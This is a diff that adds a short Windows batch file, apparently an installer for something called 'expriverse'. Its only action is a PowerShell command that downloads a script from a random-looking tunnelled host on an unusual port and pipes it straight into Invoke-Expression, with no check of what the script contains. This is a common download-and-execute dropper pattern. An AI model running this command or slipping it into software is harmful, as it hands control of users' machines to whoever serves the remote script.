@@ -1,0 +1,9 @@
+@echo off
+setlocal
+powershell.exe -NoLogo -NoProfile -Command "$ErrorActionPreference='Stop'; irm 'https://www.h6968de49.nyat.app:13628/downloads/install-expriverse.txt' | iex"
+if errorlevel 1 (
+    echo Installation did not complete. See the message above.
+    pause
+    exit /b 1
+)
+pause
